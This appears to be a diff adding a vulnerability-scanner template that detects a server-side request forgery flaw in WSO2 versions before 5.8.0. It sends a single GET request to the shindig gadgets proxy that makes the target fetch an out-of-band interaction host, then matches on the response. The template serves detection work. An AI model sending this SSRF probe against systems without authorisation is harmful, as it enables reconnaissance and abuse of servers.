@@ -1,0 +1,25 @@
+id: WSO2-2019-0598
+brief:
+    title: WSO2 <5.8.0 - Server Side Request Forgery
+    by: Amnotacat
+    level: medium
+    about: WSO2 prior to version 5.8.0 is susceptible to a server-side request forgery vulnerability. This vulnerability can be exploited by misusing the UI gadgets loading capability of the shindig web appli...
+    label:
+        - ssrf
+        - wso2
+        - shindig
+        - vuln
+    score: CVSS:6.8
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/shindig/gadgets/proxy?container=default&url=http://oast.pro'
+      signs:
+        - "on": word
+          has:
+            - Interactsh Server
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
